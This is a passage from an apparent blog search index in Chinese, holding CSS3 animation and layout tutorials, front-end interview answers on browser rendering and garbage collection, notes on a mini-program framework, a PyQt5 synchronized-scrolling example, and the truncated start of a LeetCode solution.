from &#123;background: red;&#125;\n  to &#123;background: yellow;&#125;\n&#125;\n/* Safari 和 Chrome */\n@-webkit-keyframes myfirst &#123;\n  from &#123;background: red;&#125;\n  to &#123;background: yellow;&#125;\n&#125;\n/* Opera */\n@-o-keyframes myfirst &#123;\n  from &#123;background: red;&#125;\n  to &#123;background: yellow;&#125;\n&#125;\n\n/*\n   将创建的动画绑定到选择器，并至少指定以下两项 CSS3 动画属性\n   1.指定动画的名称；\n   2.指定动画的时长；\n*/\ndiv&#123;\n  animation: myfirst 5s;\n  -moz-animation: myfirst 5s;       /* Firefox */\n  -webkit-animation: myfirst 5s;    /* Safari 和 Chrome */\n  -o-animation: myfirst 5s;         /* Opera */\n&#125;\n\n通过百分比设置动画发生的时间\n动画是使元素从一种样式逐渐变化为另一种样式的效果。可以改变任意多的样式任意多的次数。可以用关键词 “from” 和 “to”来设置动画变化发生的时间，其效果等同于 0% 和 100%。0% 是动画的开始，100% 是动画的完成。为了得到最佳的浏览器支持，应该始终定义 0% 和 100% 选择器。\n/* 当动画为 25% 及 50% 时改变背景色，然后当动画 100% 完成时再次改变 */\n@keyframes myfirst&#123;\n  0%   &#123;background: red;&#125;\n  25%  &#123;background: yellow;&#125;\n  50%  &#123;background: blue;&#125;\n  100% &#123;background: green;&#125;\n&#125;\n\n/* 同时改变背景色和位置 */\n@keyframes myfirst&#123;\n  0%   &#123;background: red; left:0px; top:0px;&#125;\n  25%  &#123;background: yellow; left:200px; top:0px;&#125;\n  50%  &#123;background: blue; left:200px; top:200px;&#125;\n  75%  &#123;background: green; left:0px; top:200px;&#125;\n  100% &#123;background: red; left:0px; top:0px;&#125;\n&#125;\n\n动画属性详解\nanimation 是除了 animation-play-state 属性所有动画属性的简写属性。\n语法： animation : animation-name | animation-duration | animation-timing-function | animation-delay | animation-iteration-count | animation-direction\n/* 应用的动画为myfirst，一个动画周期为5秒，动画的速度曲线为linear，动画2秒后播放，播放次数为infinite，即无限循环，动画下一周期是否逆向播放取值alternate，即逆向播放 */\ndiv&#123;\n  animation: myfirst 5s linear 2s infinite alternate;\n  /* Firefox: */\n  -moz-animation: myfirst 5s linear 2s infinite alternate;\n  /* Safari 和 Chrome: */\n  -webkit-animation: myfirst 5s linear 2s infinite alternate;\n  /* Opera: */\n  -o-animation: myfirst 5s linear 2s infinite alternate;\n&#125;\n\n\n\n\n属性\n描述\n\n\n\n@keyframes\n规定动画。\n\n\nanimation\n所有动画属性的简写属性，除了 animation-play-state 属性。\n\n\nanimation-name\n规定 @keyframes 动画的名称。\n\n\nanimation-duration\n规定动画完成一个周期所花费的秒或毫秒。默认是 0。\n\n\nanimation-timing-function\n规定动画的速度曲线。默认是 “ease”。\n\n\nanimation-delay\n规定动画何时开始。默认是 0。\n\n\nanimation-iteration-count\n规定动画被播放的次数。默认是 1。\n\n\nanimation-direction\n规定动画是否在下一周期逆向地播放。默认是 “normal”。\n\n\nanimation-play-state\n规定动画是否正在运行或暂停。默认是 “running”。\n\n\nanimation-fill-mode\n规定对象动画时间之外的状态。\n\n\n\nCSS3 多列\n通过 CSS3够创建多个列来对文本进行布局，就像我们经常看到的报纸的布局一样。\nCSS3 创建多列\ncolumn-count 属性规定元素应该被分隔的列数。\n\n\n/* 将div中的文本分为3列 */\ndiv&#123;\n  column-count:3;\n  -moz-column-count:3;        /* Firefox */\n  -webkit-column-count:3;     /* Safari 和 Chrome */\n&#125;\n\nCSS3 规定列之间的间隔\ncolumn-gap 属性规定列之间的间隔。\n/* 设置列之间的间隔为 40 像素 */\ndiv&#123;\n  column-gap:40px;\n  -moz-column-gap:40px;        /* Firefox */\n  -webkit-column-gap:40px;     /* Safari 和 Chrome */\n&#125;\n\nCSS3 列规则\ncolumn-rule 属性设置列之间的宽度、样式和颜色规则。\n语法： column-rule : column-rule-width | column-rule-style | column-rule-color\ndiv&#123;\n  column-rule:3px outset #ff0000;\n  -moz-column-rule:3px outset #ff0000;       /* Firefox */\n  -webkit-column-rule:3px outset #ff0000;    /* Safari and Chrome */\n&#125;\n\n\n\n\n属性\n描述\n\n\n\ncolumn-count\n规定元素应该被分隔的列数。\n\n\ncolumn-fill\n规定如何填充列。\n\n\ncolumn-gap\n规定列之间的间隔。\n\n\ncolumn-rule\n设置所有 column-rule-* 属性的简写属性。\n\n\ncolumn-rule-width\n规定列之间规则的宽度。\n\n\ncolumn-rule-style\n规定列之间规则的样式。\n\n\ncolumn-rule-color\n规定列之间规则的颜色。\n\n\ncolumn-span\n规定元素应该横跨的列数。\n\n\ncolumn-width\n规定列的宽度。\n\n\ncolumns\n语法 : column-width column-count。\n\n\n\nCSS3 用户界面\n\nCSS3 resize\n在 CSS3中resize 属性设置是否可由用户调整元素尺寸。\n/* 设置div可以由用户调整大小 */\ndiv&#123;\n  resize:both;\n  overflow:auto;\n&#125;\n\nCSS3 box-sizing\nbox-sizing 属性允许您以确切的方式定义适应某个区域的具体内容。边框计算在width中\n/* 规定两个并排的带边框方框 */\ndiv&#123;\n  box-sizing:border-box;\n  -moz-box-sizing:border-box;        /* Firefox */\n  -webkit-box-sizing:border-box;     /* Safari */\n  width:50%;\n  float:left;\n&#125;\n\nCSS3 outline-offset\noutline-offset 属性对轮廓进行偏移，并在超出边框边缘的位置绘制轮廓。\n轮廓与边框有两点不同：\n\n\n\n\n\n\n\n\n\n\n轮廓不占用空间；\n轮廓可能是非矩形；\n\n/* 规定边框边缘之外 15 像素处的轮廓 */\ndiv&#123;\n  border:2px solid black;\n  outline:2px solid red;\n  outline-offset:15px;\n&#125;\n\n\n\n\n\n浏览器1、localStorage 能跨域吗参考答案：\n不能\n解决方案：\n\n通过postMessage来实现跨源通信\n可以实现一个公共的iframe部署在某个域名中，作为共享域\n将需要实现localStorage跨域通信的页面嵌入这个iframe\n接入对应的SDK操作共享域，从而实现localStorage的跨域存储\n\n\n2、浏览器输入URL发生了什么参考答案：\n\nURL 解析\nDNS 查询\nTCP 连接\n处理请求\n接受响应\n渲染页面\n\n3、重绘、重排区别如何避免参考答案：\n\n重排(Reflow)：当渲染树的一部分必须更新并且节点的尺寸发生了变化，浏览器会使渲染树中受到影响的部分失效，并重新构造渲染树。\n\n重绘(Repaint)：是在一个元素的外观被改变所触发的浏览器行为，浏览器会根据元素的新属性重新绘制，使元素呈现新的外观。比如改变某个元素的背景色、文字颜色、边框颜色等等\n\n区别：重绘不一定需要重排（比如颜色的改变），重排必然导致重绘（比如改变网页位置）\n\n引发重排\n4.1 添加、删除可见的dom\n4.2 元素的位置改变\n4.3 元素的尺寸改变(外边距、内边距、边框厚度、宽高、等几何属性)\n4.4 页面渲染初始化\n4.5 浏览器窗口尺寸改变\n4.6 获取某些属性。当获取一些属性时，浏览器为取得正确的值也会触发重排,它会导致队列刷新，这些属性包括：offsetTop、offsetLeft、 offsetWidth、offsetHeight、scrollTop、scrollLeft、scrollWidth、scrollHeight、clientTop、clientLeft、clientWidth、clientHeight、getComputedStyle() (currentStyle in IE)。所以，在多次使用这些值时应进行缓存。\n\n优化：\n浏览器自己的优化：\n浏览器会维护1个队列，把所有会引起重排，重绘的操作放入这个队列，等队列中的操作到一定数量或者到了一定时间间隔，浏览器就会flush队列，进行一批处理，这样多次重排，重绘变成一次重排重绘\n减少 reflow&#x2F;repaint：（1）不要一条一条地修改 DOM 的样式。可以先定义好 css 的 class，然后修改 DOM 的 className。\n（2）不要把 DOM 结点的属性值放在一个循环里当成循环里的变量。（3）为动画的 HTML 元件使用 fixed 或 absoult 的 position，那么修改他们的 CSS 是不会 reflow 的。（4）千万不要使用 table 布局。因为可能很小的一个小改动会造成整个 table 的重新布局。(table及其内部元素除外，它可能需要多次计算才能确定好其在渲染树中节点的属性，通常要花3倍于同等元素的时间。这也是为什么我们要避免使用table做布局的一个原因。)\n（5）不要在布局信息改变的时候做查询（会导致渲染队列强制刷新）\n\n\n4、let a &#x3D; “sssssss”，分别存在哪儿？参考答案：\n 使用let声明的全局变量不是挂在window对象下的，声明的全局变量存在于一个块级作用域中。\n 具体查看，我们可以通过打印一个全局函数，在let声明的全局变量在全局函数的scope下，我们平时使用时直接 用变量名称就能访问\n5、浏览器垃圾回收机制参考答案：\n1. 介绍\n浏览器的 Javascript 具有自动垃圾回收机制(GC:Garbage Collecation)，也就是说，执行环境会负责管理代码执行过程中使用的内存。其原理是：垃圾收集器会定期（周期性）找出那些不在继续使用的变量，然后释放其内存。但是这个过程不是实时的，因为其开销比较大并且GC时停止响应其他操作，所以垃圾回收器会按照固定的时间间隔周期性的执行。\n不再使用的变量也就是生命周期结束的变量，当然只可能是局部变量，全局变量的生命周期直至浏览器卸载页面才会结束。局部变量只在函数的执行过程中存在，而在这个过程中会为局部变量在栈或堆上分配相应的空间，以存储它们的值，然后在函数中使用这些变量，直至函数结束，而闭包中由于内部函数的原因，外部函数并不能算是结束。\n还是上代码说明吧：\nfunction fn1() &#123;\n    var obj = &#123;name: 'hanzichi', age: 10&#125;;\n&#125;\nfunction fn2() &#123;\n    var obj = &#123;name:'hanzichi', age: 10&#125;;\n    return obj;\n&#125;\n\nvar a = fn1();\nvar b = fn2();\n复制代码\n\n我们来看代码是如何执行的。首先定义了两个function，分别叫做fn1和fn2，当fn1被调用时，进入fn1的环境，会开辟一块内存存放对象{name: ‘hanzichi’, age: 10}，而当调用结束后，出了fn1的环境，那么该块内存会被js引擎中的垃圾回收器自动释放；在fn2被调用的过程中，返回的对象被全局变量b所指向，所以该块内存并不会被释放。\n这里问题就出现了：到底哪个变量是没有用的？所以垃圾收集器必须跟踪到底哪个变量没用，对于不再有用的变量打上标记，以备将来收回其内存。用于标记的无用变量的策略可能因实现而有所区别，通常情况下有两种实现方式：标记清除和引用计数。引用计数不太常用，标记清除较为常用。\n2. 标记清除\njs中最常用的垃圾回收方式就是标记清除。当变量进入环境时，例如，在函数中声明一个变量，就将这个变量标记为“进入环境”。从逻辑上讲，永远不能释放进入环境的变量所占用的内存，因为只要执行流进入相应的环境，就可能会用到它们。而当变量离开环境时，则将其标记为“离开环境”。\nfunction test()&#123;\nvar a = 10 ;             //被标记 ，进入环境 \nvar b = 20 ;             //被标记 ，进入环境\n&#125;\ntest();                     //执行完毕 之后 a、b又被标离开环境，被回收。\n复制代码\n\n垃圾回收器在运行的时候会给存储在内存中的所有变量都加上标记（当然，可以使用任何标记方式）。然后，它会去掉环境中的变量以及被环境中的变量引用的变量的标记（闭包）。而在此之后再被加上标记的变量将被视为准备删除的变量，原因是环境中的变量已经无法访问到这些变量了。最后，垃圾回收器完成内存清除工作，销毁那些带标记的值并回收它们所占用的内存空间。 到目前为止，IE9+、Firefox、Opera、Chrome、Safari的js实现使用的都是标记清除的垃圾回收策略或类似的策略，只不过垃圾收集的时间间隔互不相同。\n3. 引用计数\n引用计数的含义是跟踪记录每个值被引用的次数。当声明了一个变量并将一个引用类型值赋给该变量时，则这个值的引用次数就是1。如果同一个值又被赋给另一个变量，则该值的引用次数加1。相反，如果包含对这个值引用的变量又取得了另外一个值，则这个值的引用次数减1。当这个值的引用次数变成0时，则说明没有办法再访问这个值了，因而就可以将其占用的内存空间回收回来。这样，当垃圾回收器下次再运行时，它就会释放那些引用次数为0的值所占用的内存。\nfunction test()&#123;\n    var a = &#123;&#125; ;         //a的引用次数为0 \n    var b = a ;         //a的引用次数加1，为1 \n    var c =a;           //a的引用次数再加1，为2\n    var b =&#123;&#125;;          //a的引用次数减1，为1\n&#125;\n复制代码\n\nNetscape Navigator3是最早使用引用计数策略的浏览器，但很快它就遇到一个严重的问题：循环引用。循环引用指的是对象A中包含一个指向对象B的指针，而对象B中也包含一个指向对象A的引用。\nfunction fn() &#123;\n    var a = &#123;&#125;;\n    var b = &#123;&#125;;\n    a.pro = b;\n    b.pro = a;\n&#125;\nfn();\n复制代码\n\n  以上代码a和b的引用次数都是2，fn()执行完毕后，两个对象都已经离开环境，在标记清除方式下是没有问题的，但是在引用计数策略下，因为a和b的引用次数不为0，所以不会被垃圾回收器回收内存，如果fn函数被大量调用，就会造成内存泄露。在IE7与IE8上，内存直线上升。\n我们知道，IE中有一部分对象并不是原生js对象。例如，其内存泄露DOM和BOM中的对象就是使用C++以COM对象的形式实现的，而COM对象的垃圾回收机制采用的就是引用计数策略。因此，即使IE的js引擎采用标记清除策略来实现，但js访问的COM对象依然是基于引用计数策略的。换句话说，只要在IE中涉及COM对象，就会存在循环引用的问题。\nvar element = document.getElementById(\"some_element\");\nvar myObject = new Object();\nmyObject.e = element;\nelement.o = myObject;\n复制代码\n\n  这个例子在一个DOM元素（element)与一个原生js对象（myObject)之间创建了循环引用。其中，变量myObject有一个属性e指向element对象；而变量element也有一个属性o回指myObject。由于存在这个循环引用，即使例子中的DOM从页面中移除，它也永远不会被回收。\n举个栗子：\n\n\n黄色是指直接被 js变量所引用，在内存里\n红色是指间接被 js变量所引用，如上图，refB 被 refA 间接引用，导致即使 refB 变量被清空，也是不会被回收的\n子元素 refB 由于 parentNode 的间接引用，只要它不被删除，它所有的父元素（图中红色部分）都不会被删除\n\n另一个例子：\nwindow.onload=function outerFunction()&#123;\n    var obj = document.getElementById(\"element\");\n    obj.onclick=function innerFunction()&#123;&#125;;\n&#125;;\n复制代码\n\n这段代码看起来没什么问题，但是obj引用了document.getElementById(‘element’)，而document.getElementById(‘element’)的onclick方法会引用外部环境中的变量，自然也包括obj，是不是很隐蔽啊。(在比较新的浏览器中在移除Node的时候已经会移除其上的event了，但是在老的浏览器，特别是ie上会有这个bug)\n解决办法：\n最简单的方式就是自己手工解除循环引用，比如刚才的函数可以这样\nmyObject.element = null;\nelement.o = null;\n\nwindow.onload=function outerFunction()&#123;\n    var obj = document.getElementById(\"element\");\n    obj.onclick=function innerFunction()&#123;&#125;;\n    obj=null;\n&#125;;\n复制代码\n\n将变量设置为null意味着切断变量与它此前引用的值之间的连接。当垃圾回收器下次运行时，就会删除这些值并回收它们占用的内存。\n要注意的是，IE9+并不存在循环引用导致Dom内存泄露问题，可能是微软做了优化，或者Dom的回收方式已经改变\n4. 内存管理\n4.1 什么时候触发垃圾回收？\n垃圾回收器周期性运行，如果分配的内存非常多，那么回收工作也会很艰巨，确定垃圾回收时间间隔就变成了一个值得思考的问题。IE6的垃圾回收是根据内存分配量运行的，当环境中存在256个变量、4096个对象、64k的字符串任意一种情况的时候就会触发垃圾回收器工作，看起来很科学，不用按一段时间就调用一次，有时候会没必要，这样按需调用不是很好吗？但是如果环境中就是有这么多变量等一直存在，现在脚本如此复杂，很正常，那么结果就是垃圾回收器一直在工作，这样浏览器就没法儿玩儿了。\n微软在IE7中做了调整，触发条件不再是固定的，而是动态修改的，初始值和IE6相同，如果垃圾回收器回收的内存分配量低于程序占用内存的15%，说明大部分内存不可被回收，设的垃圾回收触发条件过于敏感，这时候把临街条件翻倍，如果回收的内存高于85%，说明大部分内存早就该清理了，这时候把触发条件置回。这样就使垃圾回收工作职能了很多\n4.2 合理的GC方案\n1. 基础方案\nJavascript引擎基础GC方案是（simple GC）：mark and sweep（标记清除），即：\n\n遍历所有可访问的对象。\n回收已不可访问的对象。\n\n2. GC的缺陷\n和其他语言一样，javascript的GC策略也无法避免一个问题：GC时，停止响应其他操作，这是为了安全考虑。而Javascript的GC在100ms甚至以上，对一般的应用还好，但对于JS游戏，动画对连贯性要求比较高的应用，就麻烦了。这就是新引擎需要优化的点：避免GC造成的长时间停止响应。\n3. GC优化策略\nDavid大叔主要介绍了2个优化方案，而这也是最主要的2个优化方案了：\n\n分代回收（Generation GC） 这个和Java回收策略思想是一致的，也是V8所主要采用的。目的是通过区分“临时”与“持久”对象；多回收“临时对象”区（young generation），少回收“持久对象”区（tenured generation），减少每次需遍历的对象，从而减少每次GC的耗时。如图：\n这里需要补充的是：对于tenured generation对象，有额外的开销：把它从young generation迁移到tenured generation，另外，如果被引用了，那引用的指向也需要修改。 这里主要内容可以参考\n深入浅出Node\n中关于内存的介绍，很详细~\n\n增量GC 这个方案的思想很简单，就是“每次处理一点，下次再处理一点，如此类推”。如图：\n这种方案，虽然耗时短，但中断较多，带来了上下文切换频繁的问题。\n因为每种方案都其适用场景和缺点，因此在实际应用中，会根据实际情况选择方案。\n比如：低 (对象&#x2F;s) 比率时，中断执行GC的频率，simple GC更低些；如果大量对象都是长期“存活”，则分代处理优势也不大。\n\n\n6、有什么方法可以保持前后端实时通信参考答案：\n实现保持前后端实时通信的方式有以下几种\n\nWebSocket： IE10以上才支持，Chrome16, FireFox11,Safari7以及Opera12以上完全支持，移动端形势大\nevent-source: IE完全不支持（注意是任何版本都不支持），Edge76，Chrome6,Firefox6,Safari5和Opera以上支持， 移动端形势大好\nAJAX轮询： 用于兼容低版本的浏览器\n永久帧（ forever iframe）可用于兼容低版本的浏览器\nflash socket 可用于兼容低版本的浏览器\n\n7、会阻塞dom解析的资源有：1.内联css\n2.内联js\n3.普通外联js\n4.外联defer js \n5.js之前的外联css\n\ncss加载不会阻塞DOM树的解析\n\ncss加载会阻塞DOM树的渲染\n\ncss加载会阻塞后面js语句的执行\n\n\n一、iframe会阻塞主页面的onload事件；\n二、搜索引擎检索程序无法解读这种页面，不利于SEO；\n三、会影响页面的并行加载。\n并行加载：同一时间对同一域名下的加载数量是有限制的：\nMDN解析：当初始HTML文档已完全加载和解析时，将触发DOMContentLoaded事件，而不需要等待样式表，图像和子框架页面加载（事件可以用来检测HTML页面是否完全加载完毕(fully-loaded)）。\nh5新特性\n新的选择器：document.querySelector,document.querySelestorAll\n拖拽释放Api：Drag,Drop\n存储：sessionStorage,localStorage\n媒体元素 video audio\n页面间通信：postMessage\n历史：history\n全双工通信webSocket\n语义化标签\n绘画canvas\n\n浏览器9种缓存方式\nHttp缓存：是基于Http协议的浏览器缓存方式\nwebSql：只有较高版本的Chrome浏览器支持\nindexDB：是一个为了在客户端存储可观数量的结构化数据，并在这些数据上进行高性能索引的Api\nCookie：通常是网站为了辨别用户身份进行Session存储\nLocalstorage：Html5新增的一种本地缓存方案，一般用于存储数据，加快下次渲染速度\nsessionStorage：与localstorage类似，页面关闭就会销毁\napplication cache：将大部分js，css，图片等静态资源放在manifast文件配置中\ncacheStorage :serverWorker规范中定义的\nflash缓存：主要基于flash有读写浏览器端本地目录的功能\n\n大前端是什么？简单来说，大前端就是所有前端的统称，比如Android、iOS、web、Watch等，最接近用户的那一层也就是UI层，然后将其统一起来，就是大前端。大前端最大的特点在于一次开发，同时适用于所有平台，开发者不用为一个APP需要做Android和iOS两种模式而担心。大前端是web统一的时代，利用web不仅能开发出网站，更可以开发手机端web应用和移动端应用程序。\n大前端为什么出现？\n由于node的出现，前端工程师不需要依赖于后端程序而直接运行，从而前后端分离起来。所以当开发一个新产品的时候服务只需要写一次，但是面向用户的产品可能有很多，例如网站、Android客户端、iOS客户端和微信小程序等。由于各个平台使用的技术栈都不一样，代码无法复用，非常浪费人力、物力。那么有没有什么技术能够解决这一痛点呢？大前端应运而生，其实大前端的主要核心就是跨平台技术，有了跨平台技术，各个平台的差异性就抹平了，开发者只需要一套技术栈就可以开发出适用于多个平台的客户端。\n跨平台方案简介\n目前的主流跨平台方案：Cordova&#x2F;phoneGap、React Native、Weex、微信小程序、PWA和Flutter等，根据其原理性，可以分为三大类。\nH5+原生（Cordova、Ionic、微信小程序）JavaScript开发+原生渲染 （React Native、Weex、快应用）自绘UI+原生(Flutter)增强版Web App(PWA)\n","slug":"前端面试题目","date":"2022-03-31T00:42:00.000Z","categories_index":"","tags_index":"面试","author_index":"kif"},{"id":"584a7ab2a96f920d35da32116b25c0f1","title":"Anim小程序开发框架","content":"Anim小程序开发框架介绍Anim 框架是基于原生小程序 Mina 框架开发的，采用 rollup 打包，只需要引入 anim.js 即可快速使用。\n特点：\n\n基于小程序 runtime 的增强型开发框架，无需引入各类编译环境，开箱即用。\n可兼容原生使用，无需对项目进行大改，按需使用即可。\n补充多种原生小程序开发框架缺失功能，提高大型工程化项目的可维护性，让开发更省心。\n引入压缩后的文件大小不到 10 kb。\n\n# 使用# 普通引入通过 CDN 下载后，放置到小程序项目内部任意地方。推荐引入后挂载到 getApp 上，减少重复代码。\n下载地址：\n\nanim.js (min 30 kb)，下载\n\nanim.min.js (min 10 kb)，下载\n// app.js\nconst Anim = require('./lib/anim.js')\n\nApp(&#123;\n  onLaunch() &#123;\n    this.Anim = Anim\n  &#125;\n&#125;)\n\n\n// pages/index/index.js\n\n// 可以使用增强型 Anim.Page\nconst &#123; Anim &#125; = getApp()\nAnim.Page(&#123;\n  data: &#123;&#125;,\n  computed: &#123;&#125;\n&#125;)\n\n# 小程序 npm 方式引入正在开发小程序 npm 方式引入。\n# 能力# 计算属性 Computed模板内的表达式非常便利，但是设计它们的初衷是用于简单运算的。在模板中放入太多的逻辑会让模板过重且难以维护。巧妙利用 computed 方法，可以让整体代码更简洁清晰。\n计算属性是基于它们的响应式依赖进行缓存的，只在相关响应式依赖发生改变时它们才会重新求值，开发者不需要关注依赖的数据是何时更新的。\nAnim.Page(&#123;\n  data: &#123;\n    a: 1\n  &#125;,\n  computed: &#123;\n    b() &#123;\n      return this.data.a + 2\n    &#125;\n  &#125;\n&#125;)\n\n# 监听 Watch当你有一些数据需要随着其它数据变动而变动时，可以用 watch 监听数据的变化，然后执行一些逻辑。\nAnim.Page(&#123;\n  data: &#123;\n    a: 1\n  &#125;,\n  watch: &#123;\n    a(newVal, oldVal) &#123;\n      console.log('a', newVal, oldVal)\n    &#125;\n  &#125;\n&#125;)\n\n# 混入 Mixin混入 (mixin) 可以帮助开发者更好的组织页面代码逻辑，抽象出可复用的逻辑，并分发到各个页面内。当页面使用 mixins 功能时，会将配置选项按一定的规则和页面的配置项进行合并。\n支持全局混入，可以让全局共享配置。\nconst myMixin = &#123;\n  onLoad() &#123;\n    this.showMessage()\n  &#125;,\n  showMessage() &#123;\n    console.log('global show Message')\n  &#125;\n&#125;\nAnim.Page.mixin(myMixin)\n\n支持当前页面混入\nconst myMixin = &#123;\n  onLoad() &#123;\n    this.showMessage()\n  &#125;,\n  showMessage() &#123;\n    console.log('show Message')\n  &#125;\n&#125;\nAnim.Page(&#123;\n  mixins: [myMixin],\n  onLoad() &#123;\n    console.log('show another message')\n  &#125;\n&#125;)\n\n# 状态管理使用 wedux 进行全局状态管理，wedux 对数据进行了 Proxy 代理，使得所有使用该 Store 数据的地方都会被统一通知并更新。\nAnim.Page(&#123;\n  store: (state) => &#123;\n    return &#123;\n      count: state.counter.count\n    &#125;\n  &#125;\n&#125;)\n\n# 路由增强更加符合前端路由库的方法集成。后续可考虑在前端层维护一个路由栈，可以除了后退还可以支持前进等需求。URL 和参数不再需要手动拼装，舒服使用。并且参数支持更加复杂的解析，支持多层嵌套，数组参数。提高小程序开发的便利性。\n# API 增强所有的方法都是 Promise 化。\nthis.$router.navigateTo(&#123; path: string, query: Object&#125;).then(resolve)\nthis.$router.navigateBack(delta: number).then(resolve)\nthis.$router.redirectTo(&#123; path: string, query: Object&#125;).then(resolve)\nthis.$router.reLaunch(&#123; path: string, query: Object&#125;).then(resolve)\nthis.$router.switchTab(&#123; path: string, query: Object&#125;).then(resolve)\n\n# 支持复杂的 query 数据微信小程序暂时不支持复杂的 query 解析，在 Anim 框架下重新对 URL 做了解析，支持多层嵌套模式和数组参数。\n// index.js\nAnim.Page(&#123;\n  onLoad() &#123;\n    this.$router.navigateTo(&#123;\n      path: '/pages/another/another',\n      query: &#123;\n        a: &#123; b: &#123; c: 3 &#125;&#125;,\n        d: [1, 2, 3],\n        e: [&#123;key: 'val'&#125;, &#123;key: 'val'&#125;]\n      &#125;\n    &#125;)\n  &#125;\n&#125;)\n\n// another.js\nAnim.Page(&#123;\n  onLoad() &#123;\n    // 可以获取复杂数据\n    console.log(this.$route.query)\n  &#125;\n&#125;)\n\n# 突破小程序 10 层限制通过 Anim 维护的路由栈，还可以突破 10 层限制，超过十层路由时自动通过 Redirect 方法来进行路由跳转。\n# 路由响应路由数据会存放到 this.data.$route 中，方便 UI 使用。\n&lt;view>&#123;&#123;$route.query.id&#125;&#125;&lt;/view>","slug":"Anim小程序开发框架","date":"2022-05-22T12:33:00.000Z","categories_index":"","tags_index":"","author_index":"kif"},{"id":"ca23946284e7202da336ec39119c35c4","title":"pyqt5 多个tableWidget联动滚动","content":"项目中遇到了一个需求：\n开发时用到了三个tableWidget分别展示数据，但数据过多时三个表就显得比较杂乱，三表行之间无法同时滚动必然带来不好的体验，所以需要是三个tableWidget同时滚动；\n先上code：\nimport sys\n\nfrom PyQt5.QtCore import QEvent\nfrom PyQt5.QtWidgets import (QWidget, QTableWidget, QHeaderView, QHBoxLayout, QApplication, QTableWidgetItem,\n                             QAbstractItemView)\n\n\nclass MyEvent(QEvent):\n    # idType = QEvent.registerEventType()\n\n    def __init__(self, data):\n        self.data = data\n        print(\"MyEvent.idType \", data)\n\n    def get_data(self):\n        return self.data\n\n\nclass TableWidgetDemo(QWidget):\n    def __init__(self):\n        super(TableWidgetDemo, self).__init__()\n        self.initUI()\n\n    def initUI(self):\n        self.setWindowTitle(\"QTableWidget演示\")\n        self.resize(430, 230);\n        layout = QHBoxLayout()\n\n        tablewidget = QTableWidget()\n        tablewidget.setRowCount(44)\n        tablewidget.setColumnCount(3)\n        tablewidget.setHorizontalHeaderLabels(['姓名', '年龄', '籍贯'])\n\n        nameItem1 = QTableWidgetItem(\"张飞\")\n        tablewidget.setItem(0, 0, nameItem1)\n\n        ageItem1 = QTableWidgetItem(\"24\")\n        tablewidget.setItem(0, 1, ageItem1)\n\n        jgItem1 = QTableWidgetItem(\"河北\")\n        tablewidget.setItem(0, 2, jgItem1)\n\n        nameItem2 = QTableWidgetItem(\"关羽\")\n        tablewidget.setItem(1, 0, nameItem2)\n\n        ageItem2 = QTableWidgetItem(\"25\")\n        tablewidget.setItem(1, 1, ageItem2)\n\n        jgItem2 = QTableWidgetItem(\"河南\")\n        tablewidget.setItem(1, 2, jgItem2)\n\n        # 禁止编辑\n        tablewidget.setEditTriggers(QAbstractItemView.NoEditTriggers)\n\n        # 整行选择\n        tablewidget.setSelectionBehavior(QAbstractItemView.SelectRows)\n\n        # 调整列和行的大小\n        tablewidget.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)\n        tablewidget.verticalHeader().setSectionResizeMode(QHeaderView.Stretch)\n\n        # 设置水平竖直表头是否显示\n        # tablewidget.horizontalHeader().setVisible(False)\n        # tablewidget.verticalHeader().setVisible(False)\n\n        # 设置竖直表头标题，五特殊要求可以不用设置\n        # tablewidget.setVerticalHeaderLabels([\"a\",\"b\"])\n\n        # 隐藏表格线，False隐藏\n        tablewidget.setShowGrid(False)\n\n        self.scrollBar = tablewidget.verticalScrollBar()\n        self.scrollBar.valueChanged.connect(self.verticalScrollBarChanged)\n        # self.scrollBar.setValue(200)\n\n        # --------------------------\n        tablewidget2 = QTableWidget()\n        tablewidget2.setRowCount(44)\n        tablewidget2.setColumnCount(3)\n        tablewidget2.setHorizontalHeaderLabels(['姓名', '年龄', '籍贯'])\n\n        nameItem1 = QTableWidgetItem(\"张飞\")\n        tablewidget2.setItem(0, 0, nameItem1)\n\n        ageItem1 = QTableWidgetItem(\"24\")\n        tablewidget2.setItem(0, 1, ageItem1)\n\n        jgItem1 = QTableWidgetItem(\"河北\")\n        tablewidget2.setItem(0, 2, jgItem1)\n\n        nameItem2 = QTableWidgetItem(\"关羽\")\n        tablewidget2.setItem(1, 0, nameItem2)\n\n        ageItem2 = QTableWidgetItem(\"25\")\n        tablewidget2.setItem(1, 1, ageItem2)\n\n        jgItem2 = QTableWidgetItem(\"河南\")\n        tablewidget2.setItem(1, 2, jgItem2)\n\n        # 禁止编辑\n        tablewidget2.setEditTriggers(QAbstractItemView.NoEditTriggers)\n\n        # 整行选择\n        tablewidget2.setSelectionBehavior(QAbstractItemView.SelectRows)\n\n        # 调整列和行的大小\n        tablewidget2.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)\n        tablewidget2.verticalHeader().setSectionResizeMode(QHeaderView.Stretch)\n\n        # 设置水平竖直表头是否显示\n        # tablewidget.horizontalHeader().setVisible(False)\n        # tablewidget.verticalHeader().setVisible(False)\n\n        # 设置竖直表头标题，五特殊要求可以不用设置\n        # tablewidget.setVerticalHeaderLabels([\"a\",\"b\"])\n\n        # 隐藏表格线，False隐藏\n        tablewidget2.setShowGrid(False)\n        self.scrollBar2 = tablewidget2.verticalScrollBar()\n        self.scrollBar2.valueChanged.connect(self.verticalScrollBarChanged)\n        # self.scrollBar.setValue(200)\n\n        layout.addWidget(tablewidget)\n        layout.addWidget(tablewidget2)\n        self.setLayout(layout)\n\n    def verticalScrollBarChanged(self, e):\n        self.scrollBar.setValue(e)\n        self.scrollBar2.setValue(e)\n\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv)\n    example = TableWidgetDemo()\n    example.show()\n    sys.exit(app.exec_())\n\n\n关键在于监听到滚动条的变化，将滚动距离同时设置给其他TableWidget\ntablewidget2.verticalScrollBar()\n\n可以拿到tablewidget的滚动条\nself.scrollBar2.valueChanged.connect(self.verticalScrollBarChanged)\n\n将变化事件绑定到handleTextChanged方法\nself.scrollBar.setValue(e)\n\n方法里面再setValue(e)赋值\n之后再将其他的滚动条隐藏优化就可以了\n","slug":"pyqt5-多个tableWidget联动滚动","date":"2022-05-05T13:35:00.000Z","categories_index":"开发记录","tags_index":"pyqt","author_index":"kif"},{"id":"78ea3e6eb6851aa90f2a1c7bbb16d0b5","title":"Leetcode每日一题","content":"\n## title:\n\n### time:\n\n### link:\n\n### code:\n\n\n\n\ntitle:464. 我能赢吗time:5.22code:func canIWin(maxChoosableInteger, desiredTotal int) bool &#123;\n    if (1+maxChoosableInteger)*maxChoosableInteger/2 &lt; desiredTotal &#123;\n        return false\n    &#125;\n\n    dp := make([]int8, 